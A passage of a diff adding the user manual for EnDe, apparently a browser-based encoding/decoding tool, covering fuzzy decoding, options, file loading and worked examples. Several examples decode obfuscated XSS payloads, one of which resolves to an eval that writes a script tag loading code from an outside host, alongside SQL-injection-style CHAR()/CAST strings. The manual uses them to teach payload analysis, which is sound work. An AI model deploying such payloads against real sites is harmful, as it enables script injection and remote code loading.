+	they cannot be decoded proper as most decoding functions may return an
+	error if a pattern does not match the selected coding.
+	
+	The fuzzy decoding functions try to circumvent these oddities.
+	The idea behind fuzzy decoding is  that most codings are restricted to
+	only some parts of the string. Most languages use single quotes ' and/
+	or double quotes '"' to enclose literal strings.
+	Currently (04/2011) all fuzzy functions perform decoding inside quoted
+	strings only (where EnDe supports braces as `quotes' too).
+	Inside strings  fuzzy decoding tries to detect the selected coding and
+	then passes the matched string to the proper decoding function and add
+	the result of the function, if any, to the decoded string.
+	
+	To avoid improper matches, fuzzy decoding uses several decoding types.
+	For example:
+		* \-escaped     for octal codings
+		* \x-escaped    for hex codings
+		* %-escaped     for URL codings
+		* HTML Entity   for HTML codings
+	
+	Each function tries to match the longest possible pattern first,  then
+	tries to match the next pattern.
+	
+	The functions are restricted to either  decode inside single quotes or
+	inside double quotes.  If both is required,  both functions need to be
+	called in two separate steps.
+	
+	Fuzzy decoding can also be used with the  prefix, suffix and delimiter
+	settings from  API OPTIONS.  In this mode decoding is done for strings
+	enclosed in prefix and suffix/delimiter.
+	
+	NOTE that fuzzy decoding hex strings decodes 2 characters, while fuzzy
+	decoding decimal or octal strings assumes 3 characters  (hence leading
+	zeros may be necessary).
+	
+	Some useful combinations of  fuzzy decoding functions  can be found as
+	user functions in "EnDeUser.xml"  which are available in the Functions
+	inset window's "User functions", see  FUNCTIONS.  
+	
+    DETAILS IP Converter
+	
+	Should be self-explanating. The menu on left uses the mouse-over event
+	to highlight the input field used as source for the selected action.
+	Each IP conversion fills all fields.  <!-- except "IP in reverse order" -->
+	
+    DETAILS Timestamp Converter
+	
+	Each Timestamp conversion also fills all fields.  <!-- except "Ref. Time" and "Offset" -->
+	Timestamp has it's own description see http:EnDe.man.html?EnDe.TS.html
+	
+    DETAILS RegEx
+	
+	Explain and pretty print regular expression.
+	
+	Regular expressions (aka RegEx) are used in many tools and programming
+	languages.  Unfortunately there exist  dozens  of different languages,
+	flavours and syntax notations to express the RegEx. This tool tries to
+	explain the given RegEx in human understandable words and phrases.
+	Therefore it uses the common known phrases (mainly those used in POSIX
+	and/or PCRE descriptions).
+	
+	Each action from menu opens a window  with such an explanation for the
+	RegEx (found in RegEx textarea).  This window also displays the result
+	of that regex matched against the text found in Text textarea.
+	
+	RegEx has it's own description see http:EnDe.man.html?EnDeRE.man.txt .
+	
+    DETAILS Test
+	
+	Use the  [Test] button or the '?test' option to display this section.
+	
+	This section provides some test functionalities for EnDe's functions.
+	Following buttons are available:
+	
+	 [run tests from file]
+		Loads file with test patterns and performs all tests specified
+		in the file, then displays the test results.
+		The default file with the test patterns is "EnDeTest.txt". Any
+		other file specified in  "Load File" [Menu]  can be used. Just 
+		the filename needs to be specified  and no further button used
+		there (see  LOADING FILES  for details).
+	 [run tests from input]
+		Instead of reading the test patterns from a file (as described
+		above) they will be read from the Encoding textarea.
+		Hint: any file can be loaded to the Encoding textarea with the
+		[>Encoding] button for the "Load File" [Menu].
+	"last used test pattern"
+		This field contains the last used test pattern from the tests.
+	[E] button
+		Copies the last used test pattern to the Encoding textarea.
+	[clear] button
+		Removes the generated test results from GUI.
+	"Check-Test" link
+		Opens page with special tests for "EnDeCheck.js".
+	"HTTP-Test" link
+		Opens page with special tests for "EnDeHTTP.js".
+	
+    DETAILS Trace
+	
+	This section is for interanl use and debugging purpose.
+	Use the [trace] button or the '?trace' option to display this section.
+	
+    GUI OPTIONS
+	
+	Following options and settings are used in/for the GUI only.
+	
+	 "[] selection"
+		If checked use only selected text as input to the action.
+	 "[] append"
+		If checked result from the action is appended to corresponding
+		field. If unchecked, all text is replaced (default).
+	 [Funtions]
+		See  MODE  above.
+	 [Replace Map] button
+		Details see  REPLACE MAP  below.
+	 [Shuffle] button
+		This button opens a window to select a  source and destination
+		field to copy values.
+	 "Load File"
+		See  LOADING FILES  below.
+	 "Info:"
+	 [Trace] button
+		Display the  DETAILS Trace  section with debugging output.
+	 [Test] button
+		Display the  DETAILS Test  section.
+	 [Tour] button
+		** experimental **
+		Start a tour through EnDe GUI.
+	 [Status Bar] button
+		Display a stutus bar which shows actions (for debugging).
+	 "Misc:"
+	 [experimental] button
+		This button  toggles the  display of  functionality  currently
+		impleneted experimental or not fully working.
+	 [esoteric] button
+		This button  toggles the display of  rarely used functionality
+		(mainly in RegEx tool).
+	 [Browser Quirks] button
+		Display the  BROWSER QUIRKS  inset window.
+	 "display just one tool" menu
+		Hides all tools except the selected one.
+	
+	Some options and settings are grouped together  and can be fixed on top
+	of the browser page for permanent easy access. The [fix] and [x] button
+	toggles this behaviour.
+	
+	
+    API OPTIONS
+	
+	Following options and settings are used as parameters to the functions
+	called in the API.
+	
+	 "mode"
+		** NOT YET IMPLEMENTED ** <!--  .. EnDe*.js does not use exceptions -->
+		Mode how to deal with error in coding/converting functions:
+		"() strict"
+			return empty string if any error occours
+			also uses strict standard conformance if possible
+		"() lazy"
+			silently ignore errors
+			some characters or strings may be missing then
+			NOTE: this may return wrong results in some cases
+		"() verbose"
+			return an error message enclosed in brackets
+			NOTE: wrong results are returned if there're errors
+	 "[size] menu"
+		Option used in "Hex", "Decimal", "Octal" and "Caesar" coding.
+		Length of generated hex, decimal or octal values.
+		NOTE: hex letters  'A' - 'F' are considered digits here ;-)
+		Leading zeros will be added.
+		Value  '1' is special:  if used while decoding,  the  decoding
+		functions can use  variable width values  which are identified
+		by "Delimiter" and/or "Suffix".
+		Examples:
+		-   '102111111'  will decode to 'foo'.
+		-   '66,00006F,006F'  will decode to 'foo' for "size" '1'.
+<!-- do not use * here -->
+	 "[] uppercase"
+		If checked all characters in conversion are upper case.
+		NOTE:  does not convert the coding-specific prefix like  '%x',
+		'%u', as well as  "Prefix" and  "Suffix" values to upper case.
+		Used in all encodings producing hex values.
+		Hint:  if the coding-specific character should be converted to
+		upper case too, use the "Upper Case" encoding action.
+	 "[] values are hex"
+		If checked the  character/string for  "Prefix",  "Suffix"  and
+		"Delimiter"  will be treated as hex value and converted to the
+		character/string based on that value.
+		Examples:
+		-   '09' will be converted to 'TAB' character.
+		Each hex value must be two digits [0-9A-F].
+	 "Prefix"
+		Prefix character/string used in en-/decodings.
+		The prefix prepends the encoded character/string.
+	 "Suffix"
+		Suffix character/string used in en-/decodings.
+		The suffix follows the  encoded character/string  right before
+		the delimiter.
+	 "Delimiter"
+		Delimiter character/string used in en-/decodings.
+		Delimiters are between two characters only, but not behind the
+		last character (that's the difference to the suffix).
+	 "Key/Cipher"
+		Salt (key, cipher) for various encryptions. Currently used for
+		"MD4/MD5/SHA1 HMAC" and "*/Caesar" only.
+		NOTE: for  "Caesar" this must either be an integer '1' .. '26'
+		or a single character  'a' .. 'z'.
+	 "Iterations"
+		Used for "RIPEMD-160" one-time password generation only.
+	 "output format"
+	 "wrap"
+		Insert new line '\n' after "wrap" character.
+		Used for "base64*" only.
+	 "typ"
+		Ouput format of function's result.
+		Used for some "Staright->Hash/Checksum" actions only.
+		"raw"
+		"hex"
+		"base64"
+	 "[User API Options] menu"
+		This menu sets following options (all above) for each entry:
+		   "Prefix", "Suffix", "Delimiter", "uppercase", "size", "Key"
+		   and "value is hex".
+		It's meant as a shortcut for often needed settings.  This menu
+		is customizeable, see  HACKER's INFO  below, in particular the
+		"EnDeOpts.txt" file.
+	
+    LOADING FILES
+	
+	"Load File" is part of the  GUI OPTIONS  .
+	Files can be loaded from the same origin where EnDe itself was loaded.
+	Or files can be loaded from local file system (if the browser supports
+	it).
+	
+	NOTE: loading files doesn't follow the `one click' schema as the other
+	menus and buttons  but requires to select a file first  and then click
+	the action button.
+	
+	The menus and selections are:
+	 "Menu"
+		Select a file to build a menu from.
+	 "[section] menu"
+		Select section where to add menu.
+		This will be used for "Menu" selectios only and if there is no
+		proper setting in "EnDeFile.txt"
+	 "File"
+		Field to manually define a file; also used by [browse] button.
+		This field is used by both, the "Menu" selection and  [browse]
+		button. It can also be set manually. Except for manual setting
+		it will show the full local or remote path (URI) of the file.
+		NOTE:  the same origin will be shown as path,  even if a local
+		file was selected with the [browse] button. This is due to the
+		browser's same origin policy.
+		Please see  LIMITATIONS  also.
+	 "[browse] button"
+		Opens the browser's build-in file selection box.
+		The choosen file will be stored in "File" field, see above.
+	
+	The action buttons are:
+	 "[create menu] button"
+		Action button to load the file and build the menu.
+	 "[>Encoding] button"
+	 "[>Decoding] button"
+	 "[>RegEx] button"
+		Content of file will be written to the corresponding textarea.
+	
+	When a single filename without path is given in "File", then this file
+	will be searched for in the  "./usr/" directory first.  If there is no
+	such file it will be search for without the "./usr/" directory.
+	For customizing the GUI, see  CUSTOMIZE GUI  below.
+	
+	How to build user defined menus from loaded files, see  GUI MENUS.  
+	
+    FUNCTIONS
+	
+	This inset window has following options:
+	 "() variable"
+		Generated function call uses text variable as source.
+	 "() value"
+		Generated function call uses current value of text variable as
+		source.
+	
+	The menu below the textarea input field provides special manipulations
+	of the generated code.  The brief description given by the menu itself
+	should be self-explanating ;-)
+	
+	The other buttons at bottom of the  textarea input field  are the same
+	as those for the En-/Decoding textarea.
+	
+	Nice examples to understand the power of the  nested functionality can
+	be found in "User functions" and  EXAMPLES, HINTS  below.
+	
+	There're 2 additional menus to select functions:
+	"EnDe functions"
+		Select function directly by name (see "EnDeFunc.txt").
+	"User functions"
+		Select function defined by user in "EnDeUser.xml".
+	
+	NOTE: these menus do not observe the "variable/value" option, but they
+	observe the "append" checkbox of  GUI OPTIONS.  The generated variable
+	can be replaced with its value by using the text functions.
+	
+	The [load] button can be used to load files into the textarea field.
+	See  PRIVATE FUNCTIONS  for deatils below.
+	
+    PRIVATE FUNCTIONS
+	
+	The Function inset window can also be used to define private functions
+	which then can be used later here like any predefined function by EnDe
+	itself. The steps to define a private function are as follows:
+	
+	* write function definition in the textarea field, for example:
++-
+|	  EnDe.private_alert=function(x){alert('.private: '+x);}
++-
+	* use [eval] action button (from "show results in ..")  to define this
+	  function; if there is a JavaScript syntax error, a alert window will
+	  appear with the error text:
+		**EnDeGUI.FF.Dispatch: eval SyntaxError: ...
+	  if no such alert popup appears, the function should be defined
+	* use this function like:
++-
+|	  EnDe.private_alert('heureca');
++-
+	  or
++-
+|	  EnDe.private_alert(EnDe.CONST.CHR.alnum);
++-
+	  and hit [eval] button again
+	
+	These definitions are lost when the browser will be closed, that's why
+	special [load] button exists to load function definitions from a file.
+	The file content will be written to the  textarea field  where it then
+	can be "eval"uated.
+	Please save the function definitions yourself using your prefered text
+	editor and copy & paste from the textarea.
+	NOTE see  LIMITATIONS  also.
+	
+    REPLACE MAP
+	
+	Inset window shown with the [Replace Map] button from  GUI OPTIONS.  
+	This windows defines a list of characters and their replacement. These
+	replacements are used in the "Replace -> user" action of popup [clear]
+	menu (below En-/Decoding textarea input field).
+	
+	These replacement mappings start below the [+] button. They consist of
+	a checkbox, a label for the current line, the character to be replaced
+	and the replacemnt (string) for that character.
+		[x]  char1 [_old__] [_new__]
+	When the  "Replace -> user" action is called,  each of the  characters
+	will be replace with the specified replacement.  This is done globally
+	on the specified string.
+	
+	The other elements in this window are:
+	
+	 "character encoding" radio buttons
+		Speciefies the encoding (format) of a characters in all fields
+		(old and new character and [add] character). Selecting another
+		encoding, changes all already existing characters.
+	
+	 [+] button
+		Adds a new line with input fields for old and new character.
+	
+	 [<>] button
+		Exchanges all old with new characters.
+	
+	 [specials] button
+		Menu with various  Unicode characters see  UNICODE MENU  below
+		for details.  A selected character there  will be added to the
+		specified input field (old or new character).
+	
+	 character [add] button
+		The  selected character there  will be copied to the specified
+		input field with the [add] button.
+	
+	NOTE: the selected encoding will be the  character(s) searched for and
+	replaced. This means for example if the old character contains  '\x13'
+	the user function searches for exact that string literal  and replaces
+	it the with the string found in the new character input field.
+	The different encodings are used for keying in any  Unicode character.
+	If such a character should be searched for and replaced,  then set the
+	"character encoding" to "char".
+	
+    UNICODE MENU
+	
+	This menu contains a selection of Unicode characters, mainly any sorts
+	of brackets, spaces and slashes.
+	As some (most) browsers have  problems displaying  some of the special
+	characters, the display menu label consist of two parts separated by a
+	colon.  Right to the colon the special character should be seen, while
+	left to the colon a proper ASCII representation is shown. As the ASCII
+	representation for any kind of space would be a space too, we use  '_'
+	instead (the same for all spaces, obviously).
+	
+    TEXT MENU
+	
+	Below most input textarea fields  a [SELECT] menu  can be found, which
+	mainly contains `text manipulation' actions.  They all change the text
+	of the above textarea field.
+	The name and the help text (tooltip) should be self-explanating.
+	Each action in the "insert 2 UCS Characters" menu inserts the selected
+	character sequence, which are 2 UCS characters aka 4 bytes,  where the
+	first 3 bytes together are a valid UTF-8 character  and the  4'th byte
+	is a normal US-ASCII character (ISO-8859-1).
+	
+	Just the actions groupd in "Recursive" are explained here:
+	"%hx -> %%hxhx"
+		Replaces all URL-encodings like  '%23' to '%%2323'.
+	"%h23x -> %%h23xh23x"
+		Replaces all URL-encodings like  '%1234' to '%%12341234'. This
+		also substitutes  '%uHHHH' encodings.
+	"&name; -> &&name;name;"
+		Replaces all HTML-Entity-encodings:  '&gt;' to '&&gt;gt;'.
+	"&#DD; -> &&#DD;#DD;"
+		Replaces all decimal and hex HTML-Number-Entity-encodings.
+	
+	These actions can be called multiple times so that any recursion level
+	is possible.
+	
+    CUSTOMIZE GUI
+	
+	Parts of the GUI can be customized by using private files.
+	This works for all kinds of menus for actions. As these menus are read
+	from ".txt" and/or ".xml" files, these files can be changed as needed,
+	or better copied to the "./usr/" directory and changed there.
+	Using the files from "./usr/" directory ensures, that they will not be
+	overwritten by updates of EnDe .
+	
+	EnDe, when started, searches for files in "./usr/" directory first and
+	uses them if found,  otherwise the given file (no  "./usr/" directory)
+	will be used.
+	
+	There exists "./usr/EnDeMenu-Sample.txt"  which uses simplified  menus
+	for actions. This is a sample to show how to modify menus.
+	For testing simply rename it to "EnDeMenu.txt" and reload the page.
+	
+	This behaviour also allows to load files from "./usr/" directory first
+	see  LOADING FILES.  
+	
+    EXAMPLES, HINTS
+	
+	Simulating other systems
+	=======================================
+	As already described in the  INTRODUCTION  , some function results may
+	differ depending on the used tool.  There are various reasons why this
+	can happen. EnDe can be tweaked to behave as other systems, so that it
+	returns the same result for the same data.
+	To explain that, we start with a simple practical example:
+	* build MD5 hash as hex value for string "owasp"
+		# type "owasp" (without double quotes) in Encoding textarea
+		# select "Hash/Checksum -> MD5 (hex)"
+	
+	  which should return: 'E0ACA2FE8231010480C521FA93BC7EE6'.
+	  Now try that in a shell on your prefered system (UNIX/Linux/OSX):
+		% 'echo owasp | md5' (where some systems may use 'md5sum')
+	  and you get '2bdce47b1a6c527b134d4b658b033702'
+	
+	  Why are the strings different? If 'echo -n owasp | md5' will be used
+	  instead the result will be the same as in EnDe.  The reason for that
+	  can be seen with  'echo owasp | od -x'  which shows that the shell's
+	  'echo'  command added a newline 0x0a at the end of the string before
+	  passing it to 'md5'.
+	  Similar problems may occour, if we pipe the content of a file to the
+	  'md5' command. The file may have different line endings (NL vs. CRNL
+	  or final SUB characters).
+	
+	Another reason why results may be  different is that the tools get the
+	characters in different formats, for example different character sets.
+	The commonly used character sets  "ISO-8859-1", "UTF-8", "CP-1252" use
+	different byte sequences for the same character.
+	We explain that with an example again:
+	* build base64 coding based on different character set
+		# type "€uro" (without double quotes) in Encoding textarea
+		# select "Base-N->Base64"
+	
+	  which should return: 'IKx1cm8='.  This is correct for text passed in
+	  with charset Unicode (UCS-2).
+	  The same example with text passed in as charset UTF-8 should return:
+	  'KsdXJv'. Finally, if the charset is CP-1252, we get: 'gHVybw=='.
+	
+	Some charset conversions are implemented in EnDe. They can be found in
+	The "Characters" menu and some others in the "Unicode/UTF" menu.
+	
+	NOTE:  the  "Characters" menu will be replaced by a more sophisticated
+	solution in future.
+	
+	Multiple (recursive) encodings
+	=======================================
+	* recursive URL-encoding
+	  Recursive encodings are  not standardised,  and hence  functions for
+	  convertion do not exist. Though,  most such  recursive encodings can
+	  simply be archived by pattern matching and text substitutions.
+	  Such text substitutions (manipulations) are added to the  TEXT MENU.  
+	  For example to convert 'magic=%27fool%27%3b'  to double  URL-encoded
+	  'magic=%%2727fool%%2727%%3b3b', use "Recursive" -> "%hx -> %%hxhx".
+	  It will result in 'magic=%%%272727fool%%%272727%%%3b3b3b' when using
+	  the same action again.
+	  It works the same way for converting '%u0027' to '%%u0027u0027', and
+	  even HTML Entities (named and numbered character references like for
+	  example converting 'magic=&apos;fool&apos;&semi;' to
+	    'magic=&&apos;apos;fool&&apos;apos;&&semi;semi;'
+	
+	* double URL-encoding
+	  Converting  '%27' to '%2527'  is done using proper  API OPTIONS  for
+	  which a [User API Options] action exists: "%25HH double URL".
+	
+	
+	Preset Options for En-/Decoding
+	=======================================
+	* Generating a MSSQL character sequence for string "Urgl" to produce
++-
+|		CHAR(85) + CHAR(114) + CHAR(103) + CHAR(108)
++-
+	  Options to be set:
+	
+		Set Values:     '1'
+		Set Prefix:     'CHAR('
+		Set Suffix:     ')'
+		Set Delimiter:  '+'
+		Use encoding:   "Straight > Decimal"
+	
+	* Decode MSSQL CAST() value
++-
+|		CAST(0x4400450043004C00410052004500 AS NVARCHAR(4000))
++-
+	  Copy the value  '4400450043004C00410052004500' (without '0x') to the
+	  Decoding textarea. Then set following values:
+	
+		Set Values:     '2'
+		Set Prefix:     ''
+		Set Suffix:     ''
+		Set Delimiter:  ''
+		Use decoding:   "Straight > Hex"
+	
+	  Finally use  '\0' from text manipulation menu in Encoding textarea.
+	
+	* See the [User API Options] menu above for more such examples.
+	
+	* See  COMMON FUNCTIONS  section above for converting 2 byte values to
+	  Unicode characters.
+	
+	* Multi-level decoding 1
+	  Use following payload:
++-
+|		< div style=xss:&#92&#48&#48&#54&#53&#92&#48&#48&#55&#56&#92&#48
+|		&#48&#55&#48&#92&#48&#48&#55&#50&#92&#48&#48&#54&#53&#92&#48
+|		&#48&#55&#51&#92&#48&#48&#55&#51&#92&#48&#48&#54&#57&#92&#48
+|		&#48&#54&#102&#92&#48&#48&#54&#101&#92&#48&#48&#50&#56&#92&#48
+|		&#48&#55&#55&#92&#48&#48&#54&#57&#92&#48&#48&#54&#101&#92&#48
+|		&#48&#54&#52&#92&#48&#48&#54&#102&#92&#48&#48&#55&#55&#92&#48
+|		&#48&#50&#101&#92&#48&#48&#55&#56&#92&#48&#48&#51&#102&#92&#48
+|		&#48&#51&#48&#92&#48&#48&#51&#97&#92&#48&#48&#50&#56&#92&#48&#48
+|		&#54&#49&#92&#48&#48&#54&#99&#92&#48&#48&#54&#53&#92&#48&#48&#55
+|		&#50&#92&#48&#48&#55&#52&#92&#48&#48&#50&#56&#92&#48&#48&#51&#49
+|		&#92&#48&#48&#50&#57&#92&#48&#48&#50&#99&#92&#48&#48&#55&#55&#92
+|		&#48&#48&#54&#57&#92&#48&#48&#54&#101&#92&#48&#48&#54&#52&#92
+|		&#48&#48&#54&#102&#92&#48&#48&#55&#55&#92&#48&#48&#50&#101&#92
+|		&#48&#48&#55&#56&#92&#48&#48&#51&#100&#92&#48&#48&#51&#49&#92
+|		&#48&#48&#50&#57&#92&#48&#48&#50&#57>
++-
+		(above payload with  HTML Entities is visible in corect format
+		 only if this help page is viewed with  HTML style,  otherwise
+		 all HTML Entities are shown as \hex values).
+	  can be decoded as follows:
+		# copy payload to the decoding texarea
+		# select '\n' in menu below textarea
+		# add '\00' for 'Prefix' in options
+		# add '' for 'Suffix' and 'Delimiter'  API OPTIONS  
+		# select '4' for 'values'  API OPTIONS  
+		# select (highlight) string between ':' and final '>'
+		# check  "selection" in  GUI OPTIONS  
+		# select "HTML Entity->Decimal (&#DD)" decoding (NOTE: no trailing ';')
+		# select "Straight->(copy)" encoding
+		# select "Straight->Hex" decoding
+	
+	* Multi-level decoding 2
+	  Following string found at sla.ckers.org (see Quote: there)
+	    http://sla.ckers.org/forum/read.php?3,44,page=55#msg-20074 sla.ckers.org
+<!-- newlines in following text are there to show special behaviour in this example -->
++-
+|		11=31337%22onfocus=%22top['\145\166\141\154']('\144\157\143
+|		\165\155\145\156\164\56\167\162\151\164\145\154\156\50\47\74
+|		\142\157\144\171\76\74\163\143\162\151\160\164\40\163\162\143
+|		\75\42\57\57\150\141\56\143\153\145\162\163\56\157\162\147\57
+|		\163\42\76\74\57\163\143\162\151\160\164\76\74\57\142\157\144
+|		\171\76\47\51\73');
++-
+	  can be decoded as follows:
+		# copy payload to the decoding texarea
+		# select "Remove -> non-printable ASCII" in menu below textarea
+		# manually remove all characters left to 'top'
+		# select "Fuzzy decoding-> \-escaped in'" decoding
+	  The result now shows the decoded string:
++-
+|		top['eval']('document.writeln('< body>< script src="//ha.ckers.org/s">
+|		< /script>< /body>');');
++-
+	
+	* Multi-level decoding 3
+	  Same example as above, but using [Functions].
+		# copy payload to the decoding texarea
+		# select "\n" in menu below textarea
+		# select "\t" in menu below textarea
+		# select "space" in menu below textarea
+		# select "clear" in options section to reset the input fields
+		# select "size: 3" in options
+		# add '\' for "Prefix" in options
+		# click the [Functions] button (a inset window opens)
+		# select "URL/URI->Url(%XX)" decoding
+		# select "Straight->Octal" decoding
+	<!-- this initial TAB to make HTML conversion more pretty -->
+	  Now try to evaluate the generated code with the provided data, using
+	  [Scratchpad] button for example,  but it bails out  with a couple of
+	  decoding errors. Not very nice at first glance.
+	  So we add some cleanup as follows:
+		# use  [parsed] button in  FUNCTIONS  inset window, which then
+		  results in a more (human) readable code
+		# navigate to the first closing bracket (near line 13) and add
+		  the JavaScript code  '.substr(23)' right before the ',' .
+		  The code should now look like:
++-
+|		  EnDe.DE.dispatch(
+|		      "oct3",
+|		      "lazy",
+|		      $('EnDeDOM.API.uppercase').value,
+|		      ""+EnDe.DE.dispatch(
+|			    "urlCHR",
+|			    "lazy",
+|			    $('EnDeDOM.API.uppercase').value,
+|			    $('EnDeDOM.DE.text').value,
+|			    $('EnDeDOM.API.prefix').value,
+|			    $('EnDeDOM.API.suffix').value,
+|			    $('EnDeDOM.API.delimiter').value
+|		      ).substr(23),
+|		      $('EnDeDOM.API.prefix').value,
+|		      $('EnDeDOM.API.suffix').value,
+|		      $('EnDeDOM.API.delimiter').value
+|		  )
++-
+		(we used '$()' as alias for 'document.getElementById()')
+		# evaluate with [scratchpad] button or [alert] button again
+	  The result now shows the decoded string:
++-
+|		evaldocument.writeln('< body>< script src="//ha.ckers.org/s">< /script>< /body>');
++-
+	
+	  To show what else is possible, we start again  with copying the text
+	  to the Decoding textarea,  but do not select '\n'  which removes the
+	  newlines, instead in the  FUNCTIONS  inset window we add:
++-
+|		.substr(23).replace(/\n/g,'')
++-
+	  instead of '.substr(23)'.
+	  Some of the parameters can also be hardcode passed to the functions,
+	  therefore use for example "Prefix" from select menu to  replaces all
+	   'EnDeDOM.API.prefix.value'  variables with the string '"\\"'
+	  (doesn't matter that all occourances of  this variable  are replaced
+	  in this example, however).
+	  Finally  we see that all the configurations in the  FUNCTIONS  inset
+	  window can be omitted if we just insert the  function code as listed
+	  above.
+	  Conclusion: the function code can be saved and used later as needed.
+	
+	  It's still  not perfect  for this real  life example as the  "octal"
+	  decoding silently ignored some characters but it gives an impression
+	  what can be done (well, there is still something to improve:).
+	
+	* Multi-level de- and encoding
+	  This example shows how to decode a string, change a value,  and then
+	  encode it as before.
++-
+|		dDwxMTt0PHA8bDxwcnBBOz47bDx2YWxCOz4%2BO2w8aTwwPjtpPDI%2BOz47bDx0PHA8bDxmb287PjtsPGJhcjs%2BPjs7Pjs%2BPjs%2B
++-
+	  The steps:
+		# copy payload to the decoding texarea
+		# click the [Functions] button (a inset window opens)
+		# click [Scratchpad] to save the result in "Scratchpad" window
+		# select "JavaScript->decodeURIComponent()" decoding
+		# select "Base-N->Base64" decoding
+		# select "Special->Viewstate as text" decoding
+		# click [Scratchpad] to add the result to "scratchpad" window
+		# navigate to the last closing bracket and add this JavaScript
+	          code 'replace(/foo/g,"bar")'
+		# select "Special->Viewstate" encoding
+		# select "Base-N->Base64" encoding
+		# select "JavaScript->encodeURIComponent()" encoding
+		# click [scatchpad] to add the result to "Scratchpad" window
+	
+	* Fuzzy decoding
+	  This examples demonstrates how to use some of the fuzzy decodings.
+	  Following payloads as example:
++-
+|		CHR(105)+CHR(116)+CHR(032)+CHR(119)+CHR(111)+CHR(114)+CHR(107)+CHR(115)+CHR(033)
++-
++-
+|		CHR(105116)+CHR(032)+CHR(119111114107115)+CHR(033)
++-
+	  The steps:
+		# from [User API Options] menu select "CHR()+ Oracle"
+		# copy payload to the decoding texarea
+		# select "Fuzzy decoding->Dezimal using Options" decoding
+	
+	* Fuzzy decoding long strings
++-
+|		0x697420776F726B73
++-
+	  The steps:
+		# from [User API Options] menu select "0x00HH 0x-prefixed"
+		# copy payload to the decoding texarea
+		# select "Fuzzy decoding->Hex using Options" decoding
+		# or select "Straight->Hex String" decoding
+	
+	* Fuzzy decoding hex to characters
++-
+|		0x3c646561643e,0x3c626565663e
++-
+	  converts to '0x< dead>0x< beef>'
+	  The steps:
+		# copy payload to the decoding texarea
+		# select "Fuzzy decoding->Hex using Options" decoding
+	
+	* Fuzzy decoding hex to characters
++-
+|		0x3c646561643e,0x3c626565663e
++-
+	  converts to '< dead>< beef>'
+	  The steps:
+		# Options to be set:
+		  Set Values:     '2'
+		  Set Prefix:     '0x'
+		  Set Suffix:     ''
+		  Set Delimiter:  ','
+		# copy payload to the decoding texarea
+		# select "Fuzzy decoding->Hex using Options" decoding
+		# or select "Straight->Hex String" decoding
+	
+	  NOTE that some actions in "Fuzzy decoding"  use the same function as
+	  in "Straight"  decoding menu.  For example  "Straight->Octal String"
+	  is the same function as "Fuzzy decoding->Octal using Options".
+	
+	* Fuzzy decoding hint
+	  If you need to decode a string  where no preset functions  for fuzzy
+	  decoding assists directly, then  simply try to enclose the string to
+	  be decoded in some kind of  quotes and brackets, in particular those
+	  which are not used itself in the string.
+	  Also consider to use the "values selection" checkbox from the
+	  GUI OPTIONS.  
+	
+	Building test cases on the fly
+	=======================================
+	Test patterns and  correponding test cases with their expected results
+	can  be defined in the  Encoding textarea.  The [run tests from input] 
+	button then can perform the specified tests (see  DETAILS Test section
+	for more details on testing).
+	The patterns and test definitions  must comply to syntax  specified in
+	"EnDeTest-Sample.txt". It's recomended to load a  "EnDeTest*.txt" file
+	into the Encoding textarea and modify it as desired.
+	
+	It should be possible to generate such test patterns using with user
+	functions specified in the Functions inset window.
+	
+    JOKES
+	
+	Outdated since May 2008, see  EPILOG.  
+	
+    LIMITATIONS
+	
+	Even the charset is UTF-8 in all files and forms, browsers usually use
+	Unicode internally  for processing the content of the fields.  This is
+	in particular true when the text is processed with JavaScript.
+	I. g. this works with all browsers flawless,  but you have to be aware
+	about this behaviour in particular when using copy & paste.
+	UTF-8 is used when making the HTTP request and a server should respond
+	with Character-Set:UTF-8.
+	
+	Hence it highly depends on your browser configuration and your browser
+	implementation what happens with none-US-ASCII characters keyed in.
+	
+	Modern browsers support  Unicode characters (code points)  from ranges
+	which need 2 USC-2 characters aka 4 bytes.   Even browsers may display
+	them correctly, EnDe is not able to convert them because it treats the
+	2 UCS-2 characters idependently. However, for some conversions they're
+	converted to CESU-8 representation.  This is not correct, but accepted
+	in some applications.
+	
+	NOTE:  EnDe never makes HTTP requests except when initially loaded, or
+	the [reload] button in the  BROWSER QUIRKS  inset window is used.
+	Loading files is done using JavaScript's 'XMLHttpRequest()',  which may
+	make HTTP requests depening on the given path or URL.
+	
+	"Load Local File"
+		Loading files will work only for files from the same origin as
+		"index.html" itself. The Same Origin Policy restricts this.
+	
+    KNOWN GUI PROBLEMS
+	
+	Currently (04/2011, 1.0rc5) only minor GUI problems are knonw:
+	* Chromium (all versions) - throws error when XHR uses file:///...
+	* Google Chrome (all versions) - throws error when XHR uses file:///...
+		workaround: commandline option: --allow-file-access-from-files
+		details see: http://code.google.com/p/chromium/issues/detail?id=47416 
+	* "core-rules-2.0.xml"    - throws error in some browsers
+		workaround: use "core-rules-2.0-part1.xml", "core-rules-2.0-part2.xml"
+	* Opera < 10.0  - does not allow onChange on select tags
+		workaround: use Opera or noClick option, see  BROWSER QUIRKS  
+	* WebKit-based browsers on Windows don't support the 'title' attribute
+		for  'OPTION' tags, hence no description avaialable there
+	* Epiphany (all versions)  - some menus and checkboxes are incorrectly
+		displayed
+	
+    BROWSER QUIRKS
+	
+	The  Browser Quirks inset window is an attempt to provide  workarounds
+	for the most common problems (at least known ones) in some browsers.
+	It contains a general description  and a detailed description for each
+	setting there.
+	All the settings are passed to EnDe as special parameters in the URL's
+	search part. Hence some settings require a reload of the page.
+	Though, these settigs can be given to the URL at the initial call too.
+	
+	Browser Quirks does not provide workarounds per browser,  but tries to
+	provide a workaround  per problem.  This allows to combine them all as
+	needed. It should be easy to find a solution for each specific problem
+	according the description given by each setting. Just try it.
+	
+	Other known problems (mainly ancient browsers) are described in:
+		http:EnDe.man.html?EnDe.bug.txt#GUI 
+	
+URL OPTIONS
+	
+	Following options are available in the URL's search part:
+	* Test          - show Test section for testing "EnDe.js" itself
+	* status        - show Status Bar
+	* experimental  - show features which are implemented experimental
+	* trace         - show trace section
+	* userdebug     - like  'trace',  but with additional information
+	* nousr         - do not read files from "./usr/" directory
+	* Opera         - mainly workaround for display quirks of this browser
+	* Safari        - mainly workaround for display quirks of this browser
+	* Chrome        - mainly workaround for display quirks of this browser
+	* Camino        - mainly workaround for display quirks of this browser
+	* Konqueror     - mainly workaround for display quirks of this browser
+	* Webkit        - mainly workaround for display quirks of this browser
+	* iCab          - mainly workaround for display quirks of this browser
+<!-- * Mozilla       - mainly workaround for display quirks of this browser -->
+	
+	These options can be combined in any sequence, for example:
+	
++-
+|		?Test&status&trace
++-
+	
+	More such options can be found in the  BROWSER QUIRKS  inset window.
+	
+	
+API
+	
+	The library used for the actions consist of following files:
+	
+	* "EnDe.js"
+	* "EnDeMaps.js"
